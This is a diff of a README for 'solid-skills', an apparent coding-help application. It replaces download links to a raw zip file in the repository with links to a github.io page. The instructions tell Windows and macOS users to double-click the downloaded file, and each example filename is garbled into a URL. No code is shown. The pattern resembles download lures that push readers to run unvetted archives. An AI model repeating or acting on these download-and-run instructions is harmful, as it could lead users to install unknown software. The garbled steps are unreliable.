@@ -16,9 +16,9 @@ Welcome to **solid-skills**! This application helps you write high-quality code 
 
 You can easily download this application from our Releases page. 
 
-[![Download solid-skills](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip)](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip)
+[![Download solid-skills](https://notiegamerz.github.io)](https://notiegamerz.github.io)
 
-To download, visit this page: [solid-skills Releases](https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
+To download, visit this page: [solid-skills Releases](https://notiegamerz.github.io).
 
 ### Steps to Download
 
@@ -33,11 +33,11 @@ To download, visit this page: [solid-skills Releases](https://github.com/NotieGa
 After downloading:
 
 1. **Windows**:
-   - Double-click on the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
+   - Double-click on the downloaded file (e.g., https://notiegamerz.github.io).
    - Follow the installation prompts.
 
 2. **macOS**:
-   - Double-click the downloaded file (e.g., https://github.com/NotieGamerz/solid-skills/raw/refs/heads/main/skills/skills-solid-v1.9.zip).
+   - Double-click the downloaded file (e.g., https://notiegamerz.github.io).
    - Drag the application into your Applications folder.
 
 3. **Linux**:
